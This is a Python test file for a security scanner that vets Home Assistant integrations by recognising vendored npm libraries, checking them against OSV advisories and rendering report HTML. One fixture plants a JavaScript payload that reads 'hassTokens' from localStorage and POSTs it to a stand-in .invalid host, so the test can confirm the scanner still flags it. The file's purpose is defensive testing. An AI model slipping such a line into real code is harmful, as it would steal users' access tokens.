"""(0.14.1) Unchanged published libraries an integration ships (analyzers/libraries.py).

Every answer from jsDelivr, npm and OSV is faked here: no test reaches a real server. The
package names are made up. Planted hosts use .invalid. Nothing here runs JavaScript.
"""

from __future__ import annotations

import hashlib
import json
import shutil
import textwrap
from datetime import UTC, datetime
from pathlib import Path

import pytest

from sniff_test.analyzers import libraries, osv, semgrep
from sniff_test.fetch import http
from sniff_test.models import AnalyzerState, Target, TargetKind

NOW = datetime(2026, 11, 18, tzinfo=UTC)
FILLER = "function f%d(a, b) { return a + b * %d; }\n"


def _js(n: int = 0, extra: str = "") -> str:
    body = "".join(FILLER % (i, i + n) for i in range(2600))  # about 100 KB
    return body + extra


def _app(tmp_path: Path, files: dict[str, str], kind=TargetKind.INTEGRATION) -> Target:
    root = tmp_path / "custom_components" / "acme_view"
    root.mkdir(parents=True)
    (root / "manifest.json").write_text('{"domain": "acme_view", "name": "Acme"}')
    for rel, text in files.items():
        p = root / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(text)
    return Target(source=str(root), kind=kind, root=root, domain="acme_view")


def _sha(text: str) -> str:
    return hashlib.sha256(text.encode()).hexdigest()


class _Net:
    """Fake jsDelivr + npm. `known`: sha256 -> answer. `facts`: name -> (time, weekly)."""

    def __init__(self, known=None, facts=None, fail=None):
        self.known = known or {}
        self.facts = facts or {}
        self.fail = fail
        self.urls: list[str] = []

    def __call__(self, url: str, timeout: float, max_bytes: int = 0):
        self.urls.append(url)
        if self.fail and self.fail in url:
            err = http.HttpError(f"HTTP 429 for {url}")
            err.status = 429
            raise err
        if url.startswith(libraries._LOOKUP):
            return self.known.get(url.rsplit("/", 1)[-1])
        if url.startswith("https://registry.npmjs.org/"):
            name = url.rsplit("/", 1)[-1].replace("%2F", "/")
            when, _weekly = self.facts.get(name, (None, None))
            return {"time": {v: when for v in ("1.2.3", "4.10.38")}} if when else None
        if url.startswith("https://api.npmjs.org/downloads/point/last-week/"):
            name = url.split("/last-week/", 1)[1]
            _when, weekly = self.facts.get(name, (None, None))
            return {"downloads": weekly} if weekly is not None else None
        raise AssertionError(f"unexpected URL {url}")


def _osv(malware: set[str] = frozenset(), vulns: dict[str, dict] | None = None):
    def scan(_exe, lockfile, _work):
        data = json.loads(Path(lockfile).read_text())
        out = []
        for key, meta in data["packages"].items():
            if not key:
                continue
            name = key.removeprefix("node_modules/")
            p = osv._Pkg(name, meta["version"], "npm")
            if name in malware:
                p.vulns["MAL-2026-1"] = {"id": "MAL-2026-1"}
                p.groups = [{"ids": ["MAL-2026-1"]}]
            for vid, rec in (vulns or {}).get(name, {}).items():
                p.vulns[vid] = rec
                p.groups.append({"ids": [vid], "max_severity": rec.get("_cvss", "")})
            out.append(p)
        return out, ""

    return scan


@pytest.fixture
def net(monkeypatch, tmp_path):
    monkeypatch.setenv("SNIFF_TEST_CACHE", str(tmp_path / "cache"))
    real_which = shutil.which
    monkeypatch.setattr(
        shutil,
        "which",
        lambda name: "/fake/osv-scanner" if name == "osv-scanner" else real_which(name),
    )
    monkeypatch.setattr(osv, "scan_lockfile", _osv())
    monkeypatch.setattr(osv, "latest_release", lambda *a: (None, None, None))
    fake = _Net()
    monkeypatch.setattr(http, "lookup_json", fake)
    return fake


OLD_POPULAR = ("2025-01-02T10:00:00.000Z", 60_000_000)
LIB = _js(1)
LIB_ANSWER = {"type": "npm", "name": "docview-dist", "version": "4.10.38", "file": "/b.js"}


def _recognise(tmp_path, files, **kw):
    target = _app(tmp_path, files, kw.pop("kind", TargetKind.INTEGRATION))
    work = tmp_path / "work"
    work.mkdir()
    return target, work, libraries.recognise(target, work, now=NOW, **kw)


def test_a_well_known_unchanged_library_is_set_aside(tmp_path, net):
    net.known = {_sha(LIB): LIB_ANSWER}
    net.facts = {"docview-dist": OLD_POPULAR}
    _t, _w, res = _recognise(tmp_path, {"www/vendor/viewer.min.js": LIB, "www/app.js": _js(2)})
    assert set(res.aside) == {"www/vendor/viewer.min.js"}
    lib = res.libraries[0]
    assert (lib.name, lib.version, lib.published, lib.weekly) == (
        "docview-dist",
        "4.10.38",
        "2025-01-02",
        60_000_000,
    )
    assert res.analyzer.state is AnalyzerState.OK
    assert libraries.to_json(res.libraries)[0]["files"] == ["www/vendor/viewer.min.js"]


@pytest.mark.parametrize(
    "answer, facts, why",
    [
        ({**LIB_ANSWER, "type": "gh"}, OLD_POPULAR, "a GitHub repository: anyone's"),
        (LIB_ANSWER, ("2026-11-01T00:00:00.000Z", 60_000_000), "published 17 days ago"),
        (LIB_ANSWER, ("2025-01-02T00:00:00.000Z", 9_999), "too few downloads"),
        (LIB_ANSWER, (None, 60_000_000), "no publish date for that version"),
        ({**LIB_ANSWER, "name": "Bad/Name?x=1"}, OLD_POPULAR, "not an npm name"),
        ({**LIB_ANSWER, "version": "../../x"}, OLD_POPULAR, "not a version"),
        (None, OLD_POPULAR, "no match"),
    ],
)
def test_anything_short_of_every_check_is_read(tmp_path, net, answer, facts, why):
    net.known = {_sha(LIB): answer}
    net.facts = {"docview-dist": facts, "Bad/Name?x=1": facts}
    _t, _w, res = _recognise(tmp_path, {"www/vendor/viewer.min.js": LIB})
    assert res.aside == {}, why


@pytest.mark.parametrize(
    "facts, why",
    [
        (("2026-11-01T00:00:00.000Z", 60_000_000), "new"),
        (("2025-01-02T00:00:00.000Z", 9_999), "few_downloads"),
        ((None, 60_000_000), "no_facts"),
    ],
)
def test_a_lookup_that_did_not_qualify_is_kept_with_the_reason(tmp_path, net, facts, why):
    """(0.15) The report lists every library found, read or not."""
    net.known = {_sha(LIB): LIB_ANSWER}
    net.facts = {"docview-dist": facts}
    _t, _w, res = _recognise(tmp_path, {"www/vendor/viewer.min.js": LIB, "www/app.js": _js(2)})
    assert res.aside == {} and res.libraries == []
    assert res.analyzer.findings == []  # data only: never a finding
    out = libraries.lookups_json(res.lookups)
    assert (out["looked_up"], out["no_match"], out["unanswered"], out["not_npm"]) == (2, 1, 0, 0)
    [lib] = out["read"]
    assert (lib["name"], lib["version"], lib["why"]) == ("docview-dist", "4.10.38", why)
    assert lib["files"] == ["www/vendor/viewer.min.js"] and lib["advisories"] == 0


def test_osvs_answer_for_a_library_that_was_read_is_data_not_a_finding(tmp_path, net, monkeypatch):
    # jsDelivr names whichever package has the bytes, so nothing is concluded from it
    monkeypatch.setattr(osv, "scan_lockfile", _osv(malware={"docview-dist"}))
    net.known = {_sha(LIB): LIB_ANSWER}
    net.facts = {"docview-dist": ("2026-11-01T00:00:00.000Z", 5)}
    _t, _w, res = _recognise(tmp_path, {"www/vendor/viewer.min.js": LIB})
    assert res.analyzer.findings == [] and res.aside == {}
    [lib] = res.lookups["read"]
    assert (lib.why, lib.advisories) == ("new", 1)


def test_the_lookup_counts_cover_every_outcome(tmp_path, net):
    a, b, c = _js(1), _js(2), _js(3)
    net.known = {_sha(a): LIB_ANSWER, _sha(b): {**LIB_ANSWER, "type": "gh"}}
    net.facts = {"docview-dist": OLD_POPULAR}
    _t, _w, res = _recognise(tmp_path, {"www/a.js": a, "www/b.js": b, "www/c.js": c})
    out = libraries.lookups_json(res.lookups)
    assert (out["looked_up"], out["no_match"], out["not_npm"], out["read"]) == (3, 1, 1, [])
    assert libraries.to_json(res.libraries)[0]["advisories"] == 0
    assert libraries.lookups_json(None) is None


def test_a_malware_advisory_means_read_in_full_and_critical(tmp_path, net, monkeypatch):
    monkeypatch.setattr(osv, "scan_lockfile", _osv(malware={"docview-dist"}))
    net.known = {_sha(LIB): LIB_ANSWER}
    net.facts = {"docview-dist": OLD_POPULAR}
    _t, _w, res = _recognise(tmp_path, {"www/vendor/viewer.min.js": LIB})
    assert res.aside == {}
    [f] = res.analyzer.findings
    assert (f.rule_id, str(f.severity)) == ("dep-malicious", "critical")
    assert f.analyzer == libraries.NAME  # kept by the daily advisory re-check
    assert [(x.name, x.why) for x in res.lookups["read"]] == [("docview-dist", "malware")]


def test_the_advisory_recheck_keeps_a_librarys_findings():
    from sniff_test import recheck
    from sniff_test.models import AnalyzerResult

    lib = {
        "id": "a1",
        "rule_id": "dep-vuln",
        "severity": "high",
        "analyzer": "libraries",
        "evidence": "docview-dist@4.1.0 (npm): GHSA-x",
        "file": "www/v/viewer.js",
        "line": None,
    }
    py = {
        "id": "b2",
        "rule_id": "dep-vuln",
        "severity": "medium",
        "analyzer": "osv",
        "evidence": "requests@2.0.0 (PyPI): GHSA-y",
        "file": None,
        "line": None,
    }
    report = {"findings": [lib, py], "complete": True, "exposure": "local", "analyzers": []}
    out = recheck.apply(report, [], AnalyzerResult("osv-python", AnalyzerState.OK), 1, "t")
    assert [f["id"] for f in out["findings"]] == ["a1"]  # fmt: skip


def test_no_advisory_check_means_nothing_is_set_aside(tmp_path, net, monkeypatch):
    monkeypatch.setattr(osv, "scan_lockfile", lambda *a: (None, "osv-scanner exit 1"))
    net.known = {_sha(LIB): LIB_ANSWER}
    net.facts = {"docview-dist": OLD_POPULAR}
    _t, _w, res = _recognise(tmp_path, {"www/vendor/viewer.min.js": LIB})
    assert res.aside == {}
    assert res.analyzer.state is AnalyzerState.OK  # everything was read: still complete
    assert [x.why for x in res.lookups["read"]] == ["unchecked"]


def test_a_rate_limit_is_never_a_result(tmp_path, net):
    net.fail = libraries._LOOKUP
    _t, _w, res = _recognise(tmp_path, {"www/vendor/viewer.min.js": LIB})
    assert res.aside == {}
    assert res.analyzer.state is AnalyzerState.OK
    assert "1 lookup(s) unanswered (those files were read)" in res.analyzer.detail


def test_cards_small_files_and_the_setting(tmp_path, net):
    net.known = {_sha(LIB): LIB_ANSWER}
    net.facts = {"docview-dist": OLD_POPULAR}
    _t, _w, card = _recognise(tmp_path / "a", {"dist/card.js": LIB}, kind=TargetKind.PLUGIN)
    _t, _w, off = _recognise(tmp_path / "b", {"www/viewer.js": LIB}, enabled=False)
    small = "x = 1;\n" * 100
    _t, _w, tiny = _recognise(tmp_path / "c", {"www/tiny.js": small})
    for res in (card, off, tiny):
        assert res.aside == {} and res.analyzer.state is AnalyzerState.NOT_APPLICABLE
    assert not any(u.startswith(libraries._LOOKUP) for u in net.urls)


def test_lookups_are_capped_largest_first_and_cached(tmp_path, net):
    files = {f"www/v/{i:02}.js": _js(i, "x" * i) for i in range(libraries.MAX_LOOKUPS + 5)}
    target = _app(tmp_path, files)
    got = libraries.candidates(target.root)
    assert len(got) == libraries.MAX_LOOKUPS
    assert got[0][0] == f"www/v/{libraries.MAX_LOOKUPS + 4:02}.js"  # the largest
    work = tmp_path / "w"
    work.mkdir()
    libraries.recognise(target, work, now=NOW)
    first = sum(u.startswith(libraries._LOOKUP) for u in net.urls)
    libraries.recognise(target, work, now=NOW)
    assert first == libraries.MAX_LOOKUPS
    assert sum(u.startswith(libraries._LOOKUP) for u in net.urls) == first  # from the cache


def test_the_original_bytes_are_hashed(tmp_path):
    target = _app(tmp_path, {"www/a.js": LIB})
    pristine = {"www/a.js": "ab" * 32}
    assert libraries.candidates(target.root, pristine) == [("www/a.js", "ab" * 32)]


def test_set_aside_puts_files_back_even_after_an_error(tmp_path):
    target = _app(tmp_path, {"www/vendor/a.js": "a", "www/b.js": "b"})
    work = tmp_path / "w"
    with pytest.raises(RuntimeError), libraries.set_aside(target.root, ["www/vendor/a.js"], work):
        assert not (target.root / "www/vendor/a.js").exists()
        assert (target.root / "www/b.js").exists()
        raise RuntimeError
    assert (target.root / "www/vendor/a.js").read_text() == "a"


@pytest.mark.skipif(shutil.which("semgrep") is None, reason="needs semgrep")
def test_a_payload_in_a_lookalike_library_is_still_found(tmp_path, monkeypatch):
    """The attack: a library copied with a payload and published under the author's own
    young package. jsDelivr names it; the checks refuse it; Semgrep reads it."""
    monkeypatch.setenv("SNIFF_TEST_CACHE", str(tmp_path / "cache"))
    payload = textwrap.dedent("""
        const t = localStorage.getItem("hassTokens");
        fetch("https://collect.invalid/c", {method: "POST", body: t});
    """)
    evil = _js(3, payload)
    fake = _Net(
        known={_sha(evil): {**LIB_ANSWER, "name": "acme-term-utils", "version": "1.2.3"}},
        facts={"acme-term-utils": ("2026-11-10T00:00:00.000Z", 12)},
    )
    monkeypatch.setattr(http, "lookup_json", fake)
    target = _app(tmp_path, {"www/vendor/term.js": evil})
    work = tmp_path / "work"
    work.mkdir()
    res = libraries.recognise(target, work, now=NOW)
    assert res.aside == {}
    with libraries.set_aside(target.root, res.aside, work):
        found = semgrep.run(target, work)
    assert "card-token-exfil" in {f.rule_id for f in found.findings}


@pytest.mark.skipif(shutil.which("semgrep") is None, reason="needs semgrep")
def test_a_recognised_file_is_not_read_and_comes_back(tmp_path, net):
    noisy = _js(4, '\nnew Function("return 1")();\n')
    net.known = {_sha(noisy): LIB_ANSWER}
    net.facts = {"docview-dist": OLD_POPULAR}
    target, work, res = _recognise(tmp_path, {"www/vendor/viewer.min.js": noisy})
    with libraries.set_aside(target.root, res.aside, work):
        found = semgrep.run(target, work)
    assert not [f for f in found.findings if f.file == "www/vendor/viewer.min.js"]
    assert (target.root / "www/vendor/viewer.min.js").read_text() == noisy


# --- advisory severity for browser code (osv.NPM_POLICY / VENDORED_POLICY) --------------


def _vuln(vector: str, label: str) -> dict:
    return {"severity": [{"type": "CVSS_V3", "score": vector}],
            "database_specific": {"severity": label}, "summary": "s"}  # fmt: skip


@pytest.mark.parametrize(
    "vector, label, want",
    [
        ("CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H", "HIGH", "high"),  # code runs
        ("CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "CRITICAL", "high"),  # capped
        ("CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H", "HIGH", "medium"),  # ReDoS
        ("CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N", "HIGH", "medium"),
        ("CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N", "HIGH", "high"),
        ("CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N", "MODERATE", "medium"),
    ],
)
def test_browser_code_advisories(vector, label, want):
    for policy in (osv.NPM_POLICY, osv.VENDORED_POLICY):
        p = osv._Pkg("docview-dist", "4.1.0", "npm")
        p.vulns["GHSA-test"] = _vuln(vector, label)
        p.groups = [{"ids": ["GHSA-test"]}]
        [f] = osv.to_findings([p], "x.js", set(), policy)
        assert (f.rule_id, str(f.severity)) == ("dep-vuln", want), (policy.where, vector)


def test_availability_only_needs_a_vector():
    assert not osv.availability_only({"ids": ["A"]}, {"A": {"summary": "no vector"}})


def test_the_report_box_escapes_and_counts():
    from sniff_test import ui

    report = {"libraries": [{"name": "docview-dist", "version": "4.10.38",
                             "files": ["www/v/a.js", "www/v/<b>.js"],
                             "published": "2025-01-02", "weekly_downloads": 60000000}]}  # fmt: skip
    html = ui.libraries_html(report)
    assert "<b>docview-dist 4.10.38</b>" in html
    assert '<span class="muted">· 2 files · not read</span></summary>' in html  # (0.15)
    assert "Published 2025-01-02. 60,000,000 downloads last week." in html
    assert "www/v/&lt;b&gt;.js" in html and "<b>.js" not in html
    assert ui.libraries_html({}) == "" and ui.libraries_html({"libraries": []}) == ""


def test_a_long_library_list_shows_five_then_folds_the_rest():
    from sniff_test import ui

    libs = [{"name": f"pkg{i}", "version": "1.0.0", "files": [f"www/{i}.js"]} for i in range(9)]
    html = ui.libraries_html({"libraries": libs})
    assert html.count('<details class="site">') == 9 and "<summary>4 more</summary>" in html
    assert html.split('<details class="more">')[0].count('<details class="site">') == 5


# --- (0.15) what an unrecognised file says it is, in its own first lines ----------------------


@pytest.mark.parametrize(
    ("head", "want"),
    [
        ("/*!\n  Chartlib.js v11.11.1 (git: 08cb242e7d)\n  License: BSD-3-Clause\n */\nvar a;",
         ("Chartlib.js", "11.11.1")),
        ("// docview 4.10.38\nvar a;", ("docview", "4.10.38")),
        ("/* @license version 2.0.0 */", None),  # a word that isn't a name
        ('var x = "Chartlib.js v11.11.1";', None),  # not in a comment at the very start
        ("/* nothing here */ var a = 1;", None),
    ],
)  # fmt: skip
def test_a_files_own_header_is_read_as_a_claim(tmp_path, head, want):
    p = tmp_path / "x.js"
    p.write_text(head)
    assert libraries.header_claim(p) == want


def test_the_header_pattern_is_linear_on_hostile_input(tmp_path):
    import time

    p = tmp_path / "x.js"
    p.write_text("/*" + "a " * 200_000 + "v1.")
    started = time.monotonic()
    assert libraries.header_claim(p) is None
    assert time.monotonic() - started < 1


def test_an_unrecognised_files_claim_is_a_note_never_a_finding(tmp_path, net, monkeypatch):
    """The developer shipped that text: OSV's answer for the name is kept beside the claim,
    the file is read as code, and no finding comes from it."""
    from sniff_test import ui

    js = "/*! Chartlib.js v4.10.38 */\n" + _js(7)
    vulns = {"chartlib.js": {"GHSA-xxxx": {"id": "GHSA-xxxx"}}}
    monkeypatch.setattr(osv, "scan_lockfile", _osv(vulns=vulns))
    _t, _w, res = _recognise(tmp_path, {"www/chart.min.js": js})
    assert res.aside == {} and res.analyzer.findings == []
    assert res.lookups["headers"] == [
        {"file": "www/chart.min.js", "says": "Chartlib.js", "version": "4.10.38", "advisories": 1}
    ]
    html = ui.libraries_html({"library_lookups": libraries.lookups_json(res.lookups)})
    assert "says in its first lines that it is <b>Chartlib.js 4.10.38</b>" in html
    assert "If that is right, 1 known security problem is listed" in html
    assert "counts nothing from this" in html and 'class="src dev"' in html
    found = {"library_lookups": libraries.lookups_json(res.lookups),
             "readings": {"threat_level": "found"}}  # fmt: skip
    assert "Chartlib" not in ui.libraries_html(found)
